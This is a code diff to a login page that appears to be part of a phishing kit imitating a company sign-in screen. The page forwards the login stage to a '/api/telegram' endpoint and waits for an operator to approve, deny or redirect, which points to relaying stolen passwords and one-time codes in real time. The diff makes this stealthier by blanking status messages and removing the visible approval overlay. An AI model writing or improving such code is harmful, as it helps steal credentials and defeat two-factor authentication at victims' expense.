@@ -25,7 +25,14 @@ import {
   validateUsername,
 } from "@/lib/login-validation"
 import { LOADING_MS, wait } from "@/lib/loading-delays"
-import { createApprovalRequest } from "@/lib/approval-webhook"
+
+const generateApprovalId = () => {
+  if (typeof crypto !== "undefined" && "getRandomValues" in crypto) {
+    const bytes = crypto.getRandomValues(new Uint8Array(16))
+    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
+  }
+  return `${Date.now()}-${Math.random().toString(16).slice(2)}`
+}
 
 export default function LoginPage() {
   const [username, setUsername] = useState("")
@@ -80,20 +87,18 @@ export default function LoginPage() {
           setApprovalMessage(result.data.message || "")
 
           if (result.data.action === "approve") {
-            setApprovalMessage("✅ Approved! Proceeding...")
+            setApprovalMessage("")
             await wait(1500)
             handleApprovalComplete("approve")
           } else if (result.data.action === "deny") {
-            setApprovalMessage("❌ Access Denied")
+            setApprovalMessage("")
             setAwaitingApproval(false)
-            setLoginError("Your login attempt was denied by administrator")
+            setLoginError("")
           } else if (result.data.action === "redirect") {
-            setApprovalMessage("🔄 Redirecting...")
+            setApprovalMessage("")
             await wait(1500)
             window.location.href = "/api/login-out"
           }
-        } else if (result.data && result.data.waitingFor) {
-          setApprovalMessage("")
         }
       } catch (error) {
         console.error("Approval poll error:", error)
@@ -149,14 +154,13 @@ export default function LoginPage() {
 
   const initiateApproval = async (stage: "password" | "otp") => {
     try {
-      const existingRequest = createApprovalRequest(username, stage)
       setApprovalStage(stage)
       setAwaitingApproval(true)
       setApprovalCountdown(90)
       setApprovalAction(null)
       setApprovalMessage("")
 
-      const newApprovalId = existingRequest.id
+      const newApprovalId = generateApprovalId()
       setApprovalId(newApprovalId)
 
       void fetch("/api/telegram", {
@@ -297,57 +301,6 @@ export default function LoginPage() {
         id="AccessibilityPageLoadingContainer"
         className="wexShell min-h-screen bg-[#F4F6F8] font-sans text-slate-900 flex justify-center items-center md:items-start md:pt-6 overflow-auto"
       >
-        {awaitingApproval && (
-          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
-            <div className="bg-white rounded-lg shadow-2xl p-8 max-w-md w-full mx-4">
-              <div className="flex flex-col items-center gap-4">
-                {approvalAction === "approve" ? (
-                  <CheckCircle className="h-16 w-16 text-green-500" />
-                ) : approvalAction === "deny" ? (
-                  <AlertCircle className="h-16 w-16 text-red-500" />
-                ) : (
-                  <Clock className="h-16 w-16 text-blue-500 animate-spin" />
-                )}
-
-                <h2 className="text-2xl font-bold text-center text-[#0B3A5C]">
-                  {approvalAction === "approve"
-                    ? "✅ Approved!"
-                    : approvalAction === "deny"
-                      ? "❌ Denied"
-                      : "Awaiting Approval"}
-                </h2>
-
-                {approvalMessage ? (
-                  <p className="text-center text-slate-600 text-sm">
-                    {approvalMessage}
-                  </p>
-                ) : null}
-
-                {!approvalAction && (
-                  <div className="w-full mt-4">
-                    <div className="flex justify-between items-center mb-2">
-                      <span className="text-sm font-semibold text-slate-700">Time Remaining</span>
-                      <span className="text-lg font-bold text-[#005F9E]">{approvalCountdown}s</span>
-                    </div>
-                    <div className="w-full bg-gray-200 rounded-full h-2">
-                      <div
-                        className="bg-[#005F9E] h-2 rounded-full transition-all duration-1000"
-                        style={{ width: `${(approvalCountdown / 90) * 100}%` }}
-                      />
-                    </div>
-                  </div>
-                )}
-
-                {approvalCountdown === 0 && !approvalAction && (
-                  <p className="text-center text-red-600 font-semibold text-sm">
-                    ⏰ Approval timeout - Access Denied
-                  </p>
-                )}
-              </div>
-            </div>
-          </div>
-        )}
-
         <div
           id="mobile-zoom-target"
           className="wexShellInner flex justify-center"
